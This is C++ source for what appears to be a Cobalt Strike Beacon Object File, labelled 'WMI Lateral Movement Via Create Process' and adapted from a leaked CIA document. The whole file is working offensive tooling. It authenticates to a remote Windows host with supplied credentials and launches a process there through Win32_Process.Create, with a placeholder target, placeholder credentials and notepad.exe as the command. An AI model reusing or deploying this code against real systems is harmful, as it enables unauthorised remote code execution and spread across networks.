/*
 * WMI Lateral Movement Via Create Process
 * Adopted From: https://wikileaks.org/ciav7p1/cms/page_11628905.html
 * Big big huge thanks for Raffi for showing me how to create BOF with C++!
 */

#include <windows.h>
#include <stdio.h>
#include <wbemcli.h>
#include <comdef.h>
#include <combaseapi.h>
#pragma comment(lib, "wbemuuid.lib")


 /* spare us some name mangling... */
extern "C" {

#include "beacon.h"

	void go(char* buff, int len);

	DECLSPEC_IMPORT 	HRESULT  WINAPI			OLE32$CLSIDFromString(wchar_t* lpsz, LPCLSID pclsid);
	DECLSPEC_IMPORT	 HRESULT  WINAPI	 	OLE32$CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv);
	DECLSPEC_IMPORT 	HRESULT  WINAPI		 	OLE32$CoInitializeEx(LPVOID, DWORD);
	DECLSPEC_IMPORT 	VOID     WINAPI		 	OLE32$CoUninitialize();
	DECLSPEC_IMPORT 	HRESULT  WINAPI		 	OLE32$IIDFromString(wchar_t* lpsz, LPIID lpiid);
	DECLSPEC_IMPORT 	HRESULT  WINAPI	 	 	OLE32$CoSetProxyBlanket(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR* pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);
	DECLSPEC_IMPORT 	WINOLEAUTAPI		  	OLEAUT32$VariantInit(VARIANTARG *pvarg);
	DECLSPEC_IMPORT	WINOLEAUTAPI 		 	OLEAUT32$VariantClear(VARIANTARG *pvarg);
	DECLSPEC_IMPORT 	WINOLEAUTAPI		 	OleAut32$SysAllocString(const OLECHAR *);
	DECLSPEC_IMPORT 	WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
	DECLSPEC_IMPORT 	WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
	DECLSPEC_IMPORT 	WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *_Str);
	
	}

// Forward declarations
void CreateCreds(COAUTHINFO**, COAUTHIDENTITY**);

void go(char* buff, int len) {
	HRESULT hr = S_OK;
	IWbemLocator* locator = NULL;
	COAUTHIDENTITY* authidentity = (COAUTHIDENTITY*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));
	COAUTHINFO* authInfo = (COAUTHINFO*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));
	IWbemServices* pSvc = 0;
	IWbemClassObject* pClass = NULL;
	IWbemClassObject* pStartupObject = NULL;
	IWbemClassObject* pStartupInstance = NULL;
	IWbemClassObject* pInParamsDefinition = NULL;
	IWbemClassObject* pParamsInstance = NULL;

	wchar_t* Iwbmstr = L"{dc12a687-737f-11cf-884d-00aa004b2e24}";
	wchar_t* Cwbmstr = L"{4590f811-1d3a-11d0-891f-00aa004b2e24}";
	
	IID Iwbm;
	CLSID Cwbm;
	OLE32$CLSIDFromString(Cwbmstr, &Cwbm);
	OLE32$IIDFromString(Iwbmstr, &Iwbm);
	

	CreateCreds(&authInfo, &authidentity);


	hr = OLE32$CoInitializeEx(0, COINIT_APARTMENTTHREADED);
	if (hr != RPC_E_CHANGED_MODE) {
		if (FAILED(hr)) {
			//		BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx failed: 0x%08lx", hrComInit);
		}
	}




	hr = OLE32$CoCreateInstance(Cwbm, 0, CLSCTX_INPROC_SERVER, Iwbm, (void**)&locator);

	BSTR srv = L"\\\\10.1.1.1\\ROOT\\CIMV2";
	BSTR usr = L"?USER";
	BSTR pass = L"?PASSWORD";
	
	hr = locator->ConnectServer(srv, usr, pass , 0, WBEM_FLAG_CONNECT_USE_MAX_WAIT, 0, 0, &pSvc);


	hr = OLE32$CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, authidentity, EOAC_NONE);


	/*

WMIC --> Win32_Process Class -> Create method. i.e. Win32_Process.Create(...)

The prototype of the Create method

	uint32 Create(
			  [in]  string               CommandLine,					//Will handle this one
			  [in]  string               CurrentDirectory,				//And this one
			  [in]  Win32_ProcessStartup ProcessStartupInformation,		//Handled already
			  [out] uint32               ProcessId						//Ignored
		);
		

The prototype of the ProcessStartupInformation
ProcessStartupInformation{
				  uint32 CreateFlags;
				  string EnvironmentVariables[];
				  uint16 ErrorMode = 1;
				  uint32 FillAttribute;
				  uint32 PriorityClass;
				  uint16 ShowWindow;			//This is the only parameters that we are going to populate
				  string Title;
				  string WinstationDesktop;
				  uint32 X;
				  uint32 XCountChars;
				  uint32 XSize;
				  uint32 Y;
				  uint32 YCountChars;
				  uint32 YSize;
			};


pStartupInstance
pStartupObject
pInParamsDefinition
*/

	BSTR wcClassName = L"Win32_Process"; //Class name
	BSTR wcMethodName = L"Create"; //Class name
	BSTR wcStartup = L"Win32_ProcessStartup"; //Class name


	hr = pSvc->GetObject(wcClassName, 0, NULL, &pClass, NULL);


	//pInParamsDefinition will receive the paramters signature for the Win32_Process.Create(...) method. We should fill these params and call the method
	//We cannot ignore this step because the "Put" method later on will check for the parameter names.
	hr = pClass->GetMethod(wcMethodName, 0, &pInParamsDefinition, NULL);

	//We will fill the parameters in the pParamsInstance instance
	hr = pInParamsDefinition->SpawnInstance(0, &pParamsInstance);



	//Getting the Win32_ProcessStartup class definition. One of the parameters to the Win32_Process.Create() is a of type Win32_ProcessStartup, so we must create an object of that type and fill it
	hr = pSvc->GetObject(wcStartup, 0, NULL, &pStartupObject, NULL);

	hr = pStartupObject->SpawnInstance(0, &pStartupInstance); //Create an instance of Win32_ProcessStartup


	//Let's now fill the the pStartupInstance instance, remember that after we fill it, we need to add it to the pParamsInstance


	//Filling the pStartupInstance
	{

		/*	ProcessStartupInformation{
				  uint32 CreateFlags;
				  string EnvironmentVariables[];
				  uint16 ErrorMode = 1;
				  uint32 FillAttribute;
				  uint32 PriorityClass;
				  uint16 ShowWindow;			//This is the only parameters that we are going to populate
				  string Title;
				  string WinstationDesktop;
				  uint32 X;
				  uint32 XCountChars;
				  uint32 XSize;
				  uint32 Y;
				  uint32 YCountChars;
				  uint32 YSize;
			}; */

		BSTR wcProcessStartupInfo = L"ProcessStartupInformation";
		{
			BSTR wcShowWindow = L"ShowWindow"; //This is the name of the propoerty, we can't change it!
			//Arg: create the arg
			VARIANT varParams;
			OLEAUT32$VariantInit(&varParams);
			varParams.vt = VT_I2;
			varParams.intVal = SW_SHOW;

			//Pass the arg to the Win32_ProcessStartup instance and clean it
			hr = pStartupInstance->Put(wcShowWindow, 0, &varParams, 0);
			OLEAUT32$VariantClear(&varParams);
		}
		VARIANT vtDispatch;
		OLEAUT32$VariantInit(&vtDispatch);
		vtDispatch.vt = VT_DISPATCH;
		vtDispatch.byref = pStartupInstance;
		hr = pParamsInstance->Put(wcProcessStartupInfo, 0, &vtDispatch, 0);
	}




	/* 
	uint32 Create(
			  [in]  string               CommandLine,					//Will handle this one
			  [in]  string               CurrentDirectory,				//And this one
			  [in]  Win32_ProcessStartup ProcessStartupInformation,		//Handled already
			  [out] uint32               ProcessId						//Ignored
		);
	*/

	//Handling command execution
	{
		//Arg: the command to be executed
		BSTR wcCommandLine = L"CommandLine"; //This is the name of the propoerty, we can't change it!
		BSTR wcCommandExecute = L"notepad.exe";
		VARIANT varCommand;
		OLEAUT32$VariantInit(&varCommand);
		varCommand.vt = VT_BSTR;
		varCommand.bstrVal = wcCommandExecute;

		//Store the arg in the Win32_ProcessStartup and clean it
		hr = pParamsInstance->Put(wcCommandLine, 0, &varCommand, 0);
		varCommand.vt = VT_BSTR;
		varCommand.bstrVal = NULL;
		OLEAUT32$VariantClear(&varCommand);
	}

	{

		BSTR wcCurrentDirectory = L"CurrentDirectory"; //This is the name of the propoerty, we can't change it!
		VARIANT varCurrentDir;
		OLEAUT32$VariantInit(&varCurrentDir);
		varCurrentDir.vt = VT_BSTR;
		varCurrentDir.bstrVal = NULL;

		//Store the value for the in parameters
		hr = pParamsInstance->Put(wcCurrentDirectory, 0, &varCurrentDir, 0);
		OLEAUT32$VariantClear(&varCurrentDir);
	}




	/*
	uint32 Create(
	  [in]  string               CommandLine,
	  [in]  string               CurrentDirectory,
	  [in]  Win32_ProcessStartup ProcessStartupInformation,
	  [out] uint32               ProcessId
		);


	ProcessStartupInformation {
		  uint32 CreateFlags;
		  string EnvironmentVariables[];
		  uint16 ErrorMode = 1;
		  uint32 FillAttribute;
		  uint32 PriorityClass;
		  uint16 ShowWindow;
		  string Title;
		  string WinstationDesktop;
		  uint32 X;
		  uint32 XCountChars;
		  uint32 XSize;
		  uint32 Y;
		  uint32 YCountChars;
		  uint32 YSize;
		};


	*/



	//Execute Method
	IWbemClassObject* pOutParams = NULL;
	hr = pSvc->ExecMethod(wcClassName, wcMethodName, 0, NULL, pParamsInstance, &pOutParams, NULL);


	hr = S_OK;


}



void CreateCreds(COAUTHINFO** authInfo, COAUTHIDENTITY** authidentity) {

	COAUTHIDENTITY* id = (COAUTHIDENTITY*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));


	{
		id = (COAUTHIDENTITY*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));
		id->User = (USHORT*)L"?USER";
		id->Password = (USHORT*)L"?PASSWORD";
		id->Domain = (USHORT*)L"?DOMAIN";
		id->UserLength = MSVCRT$wcslen((const wchar_t*)id->User);
		id->PasswordLength = MSVCRT$wcslen((const wchar_t*)id->Password);
		id->DomainLength = MSVCRT$wcslen((const wchar_t*)id->Domain);
		id->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
	}

	COAUTHINFO* inf = (COAUTHINFO*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));

	{

		inf->dwAuthnSvc = RPC_C_AUTHN_WINNT;
		inf->dwAuthzSvc = RPC_C_AUTHZ_NONE;
		inf->pwszServerPrincName = NULL;
		inf->dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
		inf->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
		inf->pAuthIdentityData = id;
		inf->dwCapabilities = EOAC_NONE;
	}

	*authidentity = id;
	*authInfo = inf;

}
